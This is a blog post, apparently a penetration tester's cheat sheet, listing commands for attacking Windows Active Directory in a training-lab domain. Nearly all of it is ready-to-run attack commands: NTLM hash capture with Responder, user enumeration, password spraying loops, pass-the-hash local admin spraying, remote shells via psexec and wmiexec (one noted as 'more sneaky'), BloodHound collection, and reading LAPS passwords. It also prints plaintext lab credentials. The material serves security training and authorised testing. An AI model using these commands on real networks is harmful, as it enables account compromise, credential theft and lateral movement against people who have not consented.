---
layout: post
title: "AD Resources"
categories: [resources]
tags: []
author: "SoftAndoWetto"
---

Get a list of all devices that are up  
```bash
nmap -sn [IP]
```

<br><br><br>

Capture all network packets on an interface  
```bash
sudo tcpdump -i [Interface]
```

<br><br><br>

Passively listens for Windows name resolution traffic and logs potential NTLM(v1/v2) hashes.  
```bash
sudo responder -I [Interface] -A
```

<br><br><br>

Enumerate users in a domain with SMB NULL (First resort)  
```bash
crackmapexec smb 172.16.5.5 --users
```

<br><br><br>

Enumerate users in a domain with SMB NULL  
```bash
enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

<br><br><br>

Enumerate users in a domain with LDAP anonymous  
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

<br><br><br>

Brute force a list of potential users in the AD (jsmith.txt is a good wordlist)  
```bash
kerbrute userenum -d [DOMAIN] --dc [IP] jsmith.txt -o valid_ad_users
```

<br><br><br>

Enumerates users, groups, shares, and host info on Windows/AD hosts (Run both with and without credentials)  
```bash
enum4linux -a -u [USERNAME] -p [PASSWORD] [IP]
```

<br><br><br>

Pull the password policy from an AD (With credentials)  
```bash
crackmapexec smb [IP] -u [USERNAME] -p [PASSWORD] --pass-pol
```

<br><br><br>

Enumerate password policy with LDAP  
```bash
ldapsearch -h [IP] -x -b "DC=[DOMAIN],DC=[DOMAIN EXT]" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

<br><br><br>

List all domain users (In Powershell - Requires SYSTEM)  
```powershell
Import-Module .\PowerView.ps1
Get-NetUser
```

<br><br><br>

1 Liner password spray [RPCClient] (Requires file with users named valid_users.txt)  
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%[PASSWORD]" -c "getusername;quit" [IP] | grep Authority; done
```

<br><br><br>

1 Liner password spray [Kerbrute] (Requires file with users named valid_users.txt)  
```bash
kerbrute passwordspray -d [DOMAIN] --dc [IP] valid_users.txt  [PASSWORD]
```

<br><br><br>

1 Liner password spray [CrackMapExec] (Requires file with users named valid_users.txt)  
```shell-session
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
```

<br><br><br>

Local admin spraying (For password reuse across local admin accounts)  
```bash
sudo crackmapexec smb --local-auth [IP]/[SUBNET] -u administrator -H [HASH] | grep +
```

<br><br><br>

Using DomainPasswordSpray for password spraying [Windows] (Requires the Host being joined to the domain)  
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

or  
```powershell
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -UserList [USERLIST] -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

<br><br><br>

Locate the Domain Controller via DNS  
```bash
nslookup -type=SRV _ldap._tcp.dc._msdcs.domain.local
```

<br><br><br>

Locate all DC's in the domain with their IP or Hostnames  
```powershell
nltest /dclist:domain.local
```

<br><br><br>

Returns the DC you are currently authenticated with  
```powershell
echo %logonserver%
```

<br><br><br>

NMAP scan to find DC in a given subnet (Less reliable than the others)  
```bash
nmap -p 88,389,445 -sV [IP]/[SUBNET]
```

<br><br><br>

Create a shell on a given host (MUST have admin creds for that host)  
```bash
psexec.py [DOMAIN]/[USER]:'[Password]'@[IP]
```

<br><br><br>

Create a shell on a given host (MUST have admin creds for that host).  
More sneaky as there are no files uploaded, and you get Admin rather than SYSTEM  
```bash
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

<br><br><br>

Queries for all members of the Domain Admins group  
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
```

<br><br><br>

Queries for all members of the Privileged Users group  
```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
```

<br><br><br>

Extracts all data (User sessions, Users, Groups, Object Properties, etc) from a DC  
```shell
sudo bloodhound-python -u '[USERNAME]' -p '[PASSWORD]' -ns [DC IP] -d [DC] -c all
```

<br><br><br>

# Enumerating Security Controls

Checking if Windows Defender is active  
```powershell
Get-MpComputerStatus
```

<br><br><br>

Check the AppLocker whitelist for blocked executables  
```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

<br><br><br>

Check whether you are in Constrained Language Mode in powershell  
```powershell
$ExecutionContext.SessionState.LanguageMode
```

<br><br><br>

Finding which groups have **delegated** permissions to read LAPS passwords (Anti lateral movement)  
Link: [LAPS Toolkit](https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1)  
```powershell
Find-LAPSDelegatedGroups
```

<br><br><br>

Finding which groups have **all** permissions to read LAPS passwords (Anti lateral movement)  
Link: [LAPS Toolkit](https://github.com/leoloobeek/LAPSToolkit/blob/master/LAPSToolkit.ps1)  
```powershell
Find-AdmPwdExtendedRights
```

<br><br><br>

Returns a list of computers with LAPS enabled (and their passwords if the user has permission)  
```powershell
Get-LAPSComputers
```

<br><br><br>

Enumerate users on a Domain Controller  
```shell
sudo crackmapexec smb [DC IP] -u [USERNAME] -p [PASSWORD] --users
```

<br><br><br>

Enumerate groups on a Domain Controller  
```shell
sudo crackmapexec smb [DC IP] -u [USERNAME] -p [PASSWORD] --groups
```

<br><br><br>

Enumerate logged on users on a host  
```shell
sudo crackmapexec smb [HOST IP] -u [USERNAME] -p [PASSWORD] --loggedon-users
```

<br><br><br>

Will list all readable files in a given share  
```shell
sudo crackmapexec smb [IP] -u [USERNAME] -p [PASSWORD] -M spider_plus --share '[SHARE NAME]'
```

Results will be written to `/tmp/cme_spider_plus/<ip of host>`
